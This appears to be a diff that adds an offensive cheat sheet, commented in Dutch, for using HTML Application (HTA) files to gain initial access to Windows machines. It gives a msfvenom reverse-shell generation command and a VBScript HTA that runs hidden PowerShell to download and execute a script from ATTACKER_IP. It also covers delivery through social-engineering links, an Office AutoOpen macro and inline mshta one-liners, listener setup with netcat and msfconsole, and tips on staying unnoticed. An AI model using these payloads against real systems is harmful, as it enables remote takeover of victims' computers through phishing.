@@ -1,0 +1,39 @@
+# HTA Payload - HTML Application voor initial access
+# === msfvenom HTA generatie ===
+msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f hta-psh -o evil.hta
+# === Handmatige HTA met PowerShell download cradle ===
+# Sla op als evil.hta en host via HTTP server:
+# <html>
+# <head>
+# <script language="VBScript">
+#   Sub RunPS()
+#     Set objShell = CreateObject("Wscript.Shell")
+#     objShell.Run "powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')", 0
+#   End Sub
+#   RunPS
+#   self.close
+# </script>
+# </head>
+# <body></body>
+# </html>
+# === Delivery methoden ===
+# 1. Direct via URL (social engineering):
+# mshta http://ATTACKER_IP/evil.hta
+# 2. Via Office macro:
+# Sub AutoOpen()
+#   Shell "mshta http://ATTACKER_IP/evil.hta"
+# End Sub
+# 3. Via command line (al op target):
+mshta http://ATTACKER_IP/evil.hta
+# 4. Via inline (geen bestand nodig):
+mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"", 0:close")
+# === HTTP server starten ===
+python3 -m http.server 80
+# === Listener ===
+nc -nlvp 443
+# Of msfconsole:
+msfconsole -q -x "use exploit/multi/handler; set payload windows/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 443; exploit"
+# Tip: HTA draait als volwaardige applicatie, niet in browser sandbox
+# Tip: mshta.exe is een signed Windows binary (LOLBin)
+# Tip: self.close sluit het HTA venster direct na uitvoering
+# Tip: -w hidden verbergt het PowerShell venster
